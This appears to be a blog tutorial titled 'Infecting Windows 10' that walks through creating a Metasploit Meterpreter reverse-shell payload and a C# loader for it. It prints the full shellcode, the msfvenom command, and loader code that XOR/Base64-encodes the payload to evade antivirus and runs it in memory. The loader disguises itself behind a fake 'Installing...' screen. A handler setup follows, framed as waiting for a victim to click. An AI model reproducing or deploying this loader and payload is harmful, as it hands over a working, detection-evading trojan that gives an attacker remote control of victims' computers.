---
layout: post
title:  "Infecting Windows 10"
date:   2023-06-30 21:21:21 +0530
tags: [csharp,kali-linux,virus]
---

**Introduction to Infecting Windows 10**  

For my first post that has actual content, I am going to show you guys how to create a payload in Metasploit on Kali Linux and then create a loader for it in C#!  

**Step 1: Creating the Payload**  

First you need to hop on Kali and open a terminal. Then we are going to use a command to create the payload to use. Type the following in your terminal:  
```bash
$ sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$HOST LPORT=$PORT -f csharp > payload.cs
```    
You should see something like this:  
<img src="https://char2int.com/assets/images/6-30-23/image03.webp" alt="image03">  

Okay so, what does this do? This command creates a csharp file containing the payload bytes we will execute in the loader.  

<i>HOST</i> refers to the ip of the attacker (127.0.0.1)  
<i>PORT</i> refers to the port that you will listen to on the offending machine (4444)  

To find your local IP address do the following command:  
```bash
$ ifconfig
```  
You should see something like this:  
<img src="https://char2int.com/assets/images/6-30-23/image01.webp" alt="image01">  

To find your public IP address do the following command:  
```bash
$ curl icanhazip.com
```  
You should see something like this:  
<img src="https://char2int.com/assets/images/6-30-23/image02.webp" alt="image02">  

You can change your port to any number between **0 and 65536**.  

Your `payload.cs` should look something like this:  
```csharp
byte[] buf = new byte[510] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
0x51,0x65,0x48,0x8b,0x52,0x60,0x56,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,
0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,0x01,0xd0,0x66,
0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x50,0x8b,0x48,0x18,
0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,
0x48,0x01,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x41,0x58,0x41,0x58,0x5e,0x48,0x01,0xd0,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x01,0xc8,
0xc0,0xa8,0x1a,0x81,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,
0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,
0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,
0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,
0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,
0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,
0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,
0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,
0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,
0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,
0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,
0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,
0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,
0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,
0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5
};
```  
Great! Now that we have the csharp payload, let's get just the payload bytes! We can do this by running the following command:  
```bash
$ sed -i 's/0x//g' payload.cs
```   
This removes the 0x in all of the bytes! To get our final payload product, just copy everything inside of the brackets of the csharp payload! Your final payload should just be hex code and commas! See the following:
```c
fc,48,83,e4,f0,e8,cc,00,00,00,41,51,41,50,52,48,31,d2,65,48,8b,52,60,51,56,48,8b,52,18,48,8b,52,20,48,8b,72,50,4d,31,c9,48,0f,b7,4a,4a,48,31,c0,ac,3c,61,7c,02,2c,20,41,c1,c9,0d,41,01,c1,e2,ed,52,41,51,48,8b,52,20,8b,42,3c,48,01,d0,66,81,78,18,0b,02,0f,85,72,00,00,00,8b,80,88,00,00,00,48,85,c0,74,67,48,01,d0,8b,48,18,50,44,8b,40,20,49,01,d0,e3,56,4d,31,c9,48,ff,c9,41,8b,34,88,48,01,d6,48,31,c0,41,c1,c9,0d,ac,41,01,c1,38,e0,75,f1,4c,03,4c,24,08,45,39,d1,75,d8,58,44,8b,40,24,49,01,d0,66,41,8b,0c,48,44,8b,40,1c,49,01,d0,41,8b,04,88,48,01,d0,41,58,41,58,5e,59,5a,41,58,41,59,41,5a,48,83,ec,20,41,52,ff,e0,58,41,59,5a,48,8b,12,e9,4b,ff,ff,ff,5d,49,be,77,73,32,5f,33,32,00,00,41,56,49,89,e6,48,81,ec,a0,01,00,00,49,89,e5,49,bc,02,00,09,25,c0,a8,1a,81,41,54,49,89,e4,4c,89,f1,41,ba,4c,77,26,07,ff,d5,4c,89,ea,68,01,01,00,00,59,41,ba,29,80,6b,00,ff,d5,6a,0a,41,5e,50,50,4d,31,c9,4d,31,c0,48,ff,c0,48,89,c2,48,ff,c0,48,89,c1,41,ba,ea,0f,df,e0,ff,d5,48,89,c7,6a,10,41,58,4c,89,e2,48,89,f9,41,ba,99,a5,74,61,ff,d5,85,c0,74,0a,49,ff,ce,75,e5,e8,93,00,00,00,48,83,ec,10,48,89,e2,4d,31,c9,6a,04,41,58,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7e,55,48,83,c4,20,5e,89,f6,6a,40,41,59,68,00,10,00,00,41,58,48,89,f2,48,31,c9,41,ba,58,a4,53,e5,ff,d5,48,89,c3,49,89,c7,4d,31,c9,49,89,f0,48,89,da,48,89,f9,41,ba,02,d9,c8,5f,ff,d5,83,f8,00,7d,28,58,41,57,59,68,00,40,00,00,41,58,6a,00,5a,41,ba,0b,2f,0f,30,ff,d5,57,59,41,ba,75,6e,4d,61,ff,d5,49,ff,ce,e9,3c,ff,ff,ff,48,01,c3,48,29,c6,48,85,f6,75,b4,41,ff,e7,58,6a,00,59,49,c7,c2,f0,b5,a2,56,ff,d5
```  

You now have your payload and it's time to infect your victim! Except, oh wait! How do we execute it? Most methods of executing these bytes are detected by every antivirus under the sun! Head to step two to find out how to use this payload you created!  

**Step 2: Creating the Loader**  
Now that we have the payload.cs, it's time to use it! Boot up your favorite IDE and create a new .NET Framework  Console project. I'm using Visual Studio for mine...

Paste in the following code into your **main function**:
```csharp
            Console.Title = "Installing Project!"; // Fake them out
            Console.WriteLine("Installing..."); // Fake them out
            string announcements_enc = dcb.get("", false);
            string[] announcements = announcements_enc.Split(',');
            byte[] f_announcements = new byte[announcements.Length];
            for (int i = 0; i < announcements.Length; i++)
            {
                f_announcements[i] = Convert.ToByte(announcements[i], 16);
            }
            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)f_announcements.Length, 0x1000, 0x40);
            Marshal.Copy(f_announcements, 0x0000, (IntPtr)(funcAddr), f_announcements.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0x0000;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
            WaitForSingleObject(hThread, 0xffffffff);
            Console.WriteLine("Done!"); // Gottem
```  
then paste the following AFTER your **main** function:
```csharp
        [DllImport("kernel32")]

        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]

        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32")]

        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```  
Next you will need to add another C# class...
**dcb.cs**  
```csharp
 internal class dcb
    {
        public static string get(string one, bool i)
        {
            if (i)
            {
                return BE(Ehd(one));
            }
            else
            {
                return (Ehd(BD(one)));
            }
        }

        private static string Ehd(string one)
        {
            int two = CHANGEMETOARANDOMNUMBER; // ex. 203948
            StringBuilder szIn = new StringBuilder(one);
            StringBuilder szOut = new StringBuilder(one.Length);
            char Textch;
            for (int iCount = 0; iCount < one.Length; iCount++)
            {
                Textch = szIn[iCount];
                Textch = (char)(Textch ^ two);
                szOut.Append(Textch);
            }
            return szOut.ToString();
        }

        private static string BE(string one)
        {
            var p = System.Text.Encoding.UTF8.GetBytes(one);
            return System.Convert.ToBase64String(p);

        }
        public static string BD(string one)
        {
            var b = System.Convert.FromBase64String(one);
            return System.Text.Encoding.UTF8.GetString(b);
        }
    }
```  
Make sure you change CHANGEMETOARANDOMNUMBER to a random number.  
Next you need to paste your payload into the line:
```csharp
string announcements_enc = dcb.get("PAYLOAD", false);
```  
and change the line to:
```csharp
Console.WriteLine(dcb.get("PAYLOAD", true));
```  
to see what the encrypted payload is. You also need to comment out the rest of your code to see something like this:
<img src="https://char2int.com/assets/images/6-30-23/image04.webp" alt="image04">  
Copy the output to where you had put your payload originally, uncomment your commented code, and revert the Console.WriteLine line back to string anncouncements_enc:  
<img src="https://char2int.com/assets/images/6-30-23/image05.webp" alt="image05">  
Now that all of our coding is done, it's time to explain what this does!  
To start out with the Main(strings[] args) function, this is just the main function that the program runs. On the first couple line we are making the program write to the console to make it seem like we're installing some kind of software while we execute the payload.
```csharp
            string announcements_enc = dcb.get("ENCPAYLOAD", false);
            string[] announcements = announcements_enc.Split(',');
            byte[] f_announcements = new byte[announcements.Length];
            for (int i = 0; i < announcements.Length; i++)
            {
                f_announcements[i] = Convert.ToByte(announcements[i], 16);
            }
```
This piece of code grabs our stored payload bytes from the dcb.get function (which I will explain next) and then splits each byte by the comma separating them,  then adding them all into a byte array. Usually payloads are orignially just a byte array but there is a very good reason as to why we store them this way. If we were to store the bytes just as a byte array at compile time (meaning those bytes are written in by us and cane be seen in the compiled binary), then most antivirus software would be able to easily detect that we have a public payload in our program! If we store them as a string and then add them to a byte list at compile time the antivirus has a much harder time detecting that it is a payload.
[This article](https://damonmohammadbagher.github.io/Posts/ebookBypassingAVsByCsharpProgramming/index.htm) does  a very good job demonstrating this here:  
<img src="https://char2int.com/assets/images/6-30-23/image07.webp" alt="image07">  
Back to the dcb.get function and the dcb class as a whole. The function and class server as an extra layer of security. The dcb.get function when given a true bool, returns an encrypted string using Base64 and XOR Encryption. When a false bool is passed, it attempts to decrypt this string and give back the original string. That is why I had you change the `int two = CHANGEMETOARANDOMNUMBER;` line to a random number, because that is your encryption key and it should not be the same for everyone or that defeats the purpose.
Finally, the last bit of code here:
```csharp
            UInt32 funcAddr = VirtualAlloc(0x0000, (UInt32)f_announcements.Length, 0x1000, 0x40);
            Marshal.Copy(f_announcements, 0x0000, (IntPtr)(funcAddr), f_announcements.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0x0000;
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0x0000, 0x0000, funcAddr, pinfo, 0x0000, ref threadId);
            WaitForSingleObject(hThread, 0xffffffff);
            Console.WriteLine("Done!"); // Gottem
```
allocates virtual memory for our payload to go in to, executes it, and waits for a return to close the program. All of the DLL imports stuff after the main function is just settings up the Windows API function calls that is code uses to allocate and execute said memory.

**Step 3: Execution**  
It's finally time to attack! Open up a new terminal on Kali and type in the following commands:
Open Metasploit Framework with the following command:  
```bash
$ sudo msfconsole
```   
Then set the exploit handler type and payload with:  
```bash
$ use multi/handler
$ set PAYLOAD windows/x64/meterpreter/reverse_tcp
```  
Next we need to set our attacker ip and port again to listen to:
```bash
$ set LHOST CHANGEME
$ set LPORT CHANGEME  
```  
Finally all we need to do is:  
```bash
$ exploit
```  
aaaand now we wait!
Now the program will wait for the victim to click on the program!
See it in action:  